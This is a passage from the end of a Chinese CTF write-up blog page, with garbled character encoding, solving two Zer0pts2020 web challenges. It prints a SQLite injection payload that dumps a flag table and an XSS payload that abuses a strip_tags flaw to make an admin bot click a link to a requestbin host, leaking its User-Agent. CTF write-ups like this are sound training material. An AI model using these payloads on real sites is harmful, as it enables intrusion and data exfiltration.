<p>å‚æ•°å¤„æœ‰ 32 é•¿åº¦çš„å­—ç¬¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è¿›è¡Œå¸¸è§„çš„æŸ¥è¡¨æŸ¥å­—æ®µï¼Œä¸è¿‡æˆ‘ä»¬ç›´æ¥ç›´æ¥æŸ¥è¯¢å½“å‰è¡¨çš„ sql è¯­å¥ï¼Œè¿˜æœ‰è¿‡æ»¤äº†ä¸€äº›æ ‡ç‚¹ç¬¦å·ï¼Œå…¶ä¸­è¿‡æ»¤äº†æ³¨é‡Šç¬¦ <code>--</code> ï¼Œå¯ä»¥ç”¨ <code>;</code> è¿›è¡Œé—­åˆ</p>
<p>æŸ¥è¯¢å½“å‰è¡¨çš„æ•°æ®æ“ä½œ</p>
<pre><code>table_name=kk as select [sql][&amp;columns[0][name]=1&amp;columns[0][type]=]from sqlite_master;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111551.png" alt="image-20200523182143870"></p>
<p>ç›´æ¥æŸ¥å€¼å°±å¥½</p>
<pre><code>table_name=kk as select [flag_2a2d04c3][&amp;columns[0][name]=1&amp;columns[0][type]=1]from flag_bf1811da;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111548.png" alt="image-20200523182310654">``</p>
<h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog</h2><p><strong>xss</strong></p>
<p>é¦–å…ˆæœä¸€ä¸‹ flag åœ¨å“ªé‡Œ</p>
<p>å¯ä»¥çœ‹åˆ° admin ä¼šå¯¹æˆ‘ä»¬çš„æ–‡ç« è¿›è¡Œç‚¹èµï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•åœ¨æ–‡ç« ä¸­åµŒå…¥ <code>#like</code> æ ‡ç­¾</p>
<pre><code># /worker/worker.js
const crawl = async (url) =&gt; &#123;
    console.log(`[+] Query! ($&#123;url&#125;)`);
    const page = await browser.newPage();
    try &#123;
        await page.setUserAgent(flag);
        await page.goto(url, &#123;
            waitUntil: &#39;networkidle0&#39;,
            timeout: 10 * 1000,
        &#125;);
        await page.click(&#39;#like&#39;);
    &#125; catch (err)&#123;
        console.log(err);
    &#125;
    await page.close();
    console.log(`[+] Done! ($&#123;url&#125;)`)
&#125;;</code></pre><p>åœ¨æ–‡ç« æ¸²æŸ“çš„åœ°æ–¹å®ƒç”¨åˆ°äº† <code>render_tags</code></p>
<pre><code># web/www/post.php
&lt;div class=&quot;mt-3&quot;&gt;
    &lt;?= render_tags($post[&#39;content&#39;]) ?&gt;
&lt;/div&gt;</code></pre><p>è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªå‡½æ•°åšäº†ä»€ä¹ˆï¼Œå°±æ˜¯åªç•™ä¸‹ <code>&lt;audio&gt;</code> æ ‡ç­¾</p>
<pre><code># web/www/util.php
function render_tags($str) &#123;
  $str = preg_replace(&#39;/\[\[(.+?)\]\]/&#39;, &#39;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#39;, $str);
  $str = strip_tags($str, &#39;&lt;audio&gt;&#39;); // only allows `&lt;audio&gt;`
  return $str;
&#125;</code></pre><p>ä½†æ˜¯ <code>strip_tags</code> è¿™ä¸ªå‡½æ•°æ˜¯å­˜åœ¨æ¼æ´çš„ï¼Œå‚è€ƒ </p>
<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2018/03/19/wrong-usage-of-filter-function/">https://blog.spoock.com/2018/03/19/wrong-usage-of-filter-function/</a></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¼æ´æ„é€ ä¸€ä¸ª <code>&lt;a&gt;</code> æ ‡ç­¾</p>
<pre><code>&lt;a/udio id=like href=http://http.requestbin.buuoj.cn/1c7z4dg1&gt;xss&lt;/audio&gt;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111543.png" alt="image-20200525110253009"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2020/05/26/BUUCTF-2/">https://tyaoo.github.io/2020/05/26/BUUCTF-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/05/27/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%9F%A5%E8%AF%86/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Linuxææƒå°çŸ¥è¯†</div></div></a></div><div class="next-post pull-right"><a href="/2020/05/26/BUUCTF-1/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">BUUCTF-1</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-JustEscape"><span class="toc-number">1.</span> <span class="toc-text">[HFCTF2020]JustEscape</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-EasyLogin"><span class="toc-number">2.</span> <span class="toc-text">[HFCTF2020]EasyLogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-BabyUpload"><span class="toc-number">3.</span> <span class="toc-text">[HFCTF2020]BabyUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.</span> <span class="toc-text">[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-number">5.</span> <span class="toc-text">[WUSTCTF2020]æœ´å®æ— å</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-CV-Maker"><span class="toc-number">6.</span> <span class="toc-text">[WUSTCTF2020]CV Maker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-easyweb"><span class="toc-number">7.</span> <span class="toc-text">[WUSTCTF2020]easyweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-Train-Yourself-To-Be-Godly"><span class="toc-number">8.</span> <span class="toc-text">[WUSTCTF2020]Train Yourself To Be Godly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">9.</span> <span class="toc-text">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-number">10.</span> <span class="toc-text">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-ReadlezPHP"><span class="toc-number">11.</span> <span class="toc-text">[NPUCTF2020]ReadlezPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-ezlogin"><span class="toc-number">12.</span> <span class="toc-text">[NPUCTF2020]ezlogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E"><span class="toc-number">13.</span> <span class="toc-text">[NPUCTF2020]éªŒè¯ğŸ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-ezinclude"><span class="toc-number">14.</span> <span class="toc-text">[NPUCTF2020]ezinclude</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b01lers2020-Welcome-to-Earth"><span class="toc-number">15.</span> <span class="toc-text">[b01lers2020]Welcome to Earth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b01lers2020-Life-on-Mars"><span class="toc-number">16.</span> <span class="toc-text">[b01lers2020]Life on Mars</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b01lers2020-Space-Noodles"><span class="toc-number">17.</span> <span class="toc-text">[b01lers2020]Space Noodles</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b01lers2020-Scrambled"><span class="toc-number">18.</span> <span class="toc-text">[b01lers2020]Scrambled</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FireshellCTF2020-Caas"><span class="toc-number">19.</span> <span class="toc-text">[FireshellCTF2020]Caas</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FireshellCTF2020-URL-TO-PDF"><span class="toc-number">20.</span> <span class="toc-text">[FireshellCTF2020]URL TO PDF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FireshellCTF2020-ScreenShooter"><span class="toc-number">21.</span> <span class="toc-text">[FireshellCTF2020]ScreenShooter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FireshellCTF2020-Cars"><span class="toc-number">22.</span> <span class="toc-text">[FireshellCTF2020]Cars</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ezpop"><span class="toc-number">23.</span> <span class="toc-text">[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-number">24.</span> <span class="toc-text">[MRCTF2020]Ez_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ezpop-Revenge"><span class="toc-number">25.</span> <span class="toc-text">[MRCTF2020]Ezpop_Revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zer0pts2020-phpNantokaAdmin"><span class="toc-number">26.</span> <span class="toc-text">[Zer0pts2020]phpNantokaAdmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zer0pts2020-musicblog"><span class="toc-number">27.</span> <span class="toc-text">[Zer0pts2020]musicblog</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>